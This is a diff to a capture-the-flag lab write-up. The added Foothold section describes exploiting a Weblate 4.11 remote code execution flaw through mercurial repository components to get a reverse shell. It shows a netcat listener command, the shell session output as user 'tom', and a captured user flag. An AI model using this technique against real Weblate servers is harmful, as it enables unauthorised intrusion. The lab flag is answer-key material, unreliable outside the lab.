@@ -40,13 +40,10 @@ Port 80 is open and running a service, we can check on the IP address listed to 
 After checking the website IP Address, we find the address is active and opens to a online bookshop:
 
 Port 80:
-
-![](Pasted%20image%2020260817095935.png)
-
+Active
 
 Port 8000:
-
-
+Active
 # Enumeration
 
 Knowing that the IP Address is up and available we are going to search around on the website for more available vulnerability information. 
@@ -88,11 +85,41 @@ niffenegger
 
 # Foothold
 
-Now that we are logged into the 
+Now that we are logged into the admin account we are going to attempt a known vulnerability of the the weblate 4.11 version.
+
+A known vulnerability for this site is posted at this link -> https://security.snyk.io/vuln/SNYK-PYTHON-WEBLATE-2414088
+
+The vulnerability makes use of remote code execution from the "add project component" sections of the website.
+
+![](Pasted%20image%2020260817204230.png)
+
+With some small modifications of my own, we can attempt the above steps to earn a reverse shell from the website.
+
+Exploit Run using Remote Code Execution: 
+![](Pasted%20image%2020260817205736.png)
+
+We use the above vulnerability on mercurial repositories to gain a reverse shell and learn that we are logged in as a user named "Tom."
+
+Output:
+
+nc -lvvp 80                                                     
+listening on [any] 80 ...
+192.168.109.19: inverse host lookup failed: Unknown host
+connect to [192.168.45.173] from (UNKNOWN) [192.168.109.19] 37032
+bash: cannot set terminal process group (897): Inappropriate ioctl for device
+bash: no job control in this shell
+<b/python3.10/site-packages/data/vcs/poc/mercurial$ whoami
+whoami
+tom
+
+After taking a quick search through the home directory we find a, "local.txt" file with our first User Flag!!
+
+==User Flag (1st Flag):== **b3de70ea1913599228a4fd4b5385bcb5**
+
 # Privilege Escalation
 
 
-## HTB Question Checklist
+
 
 
 
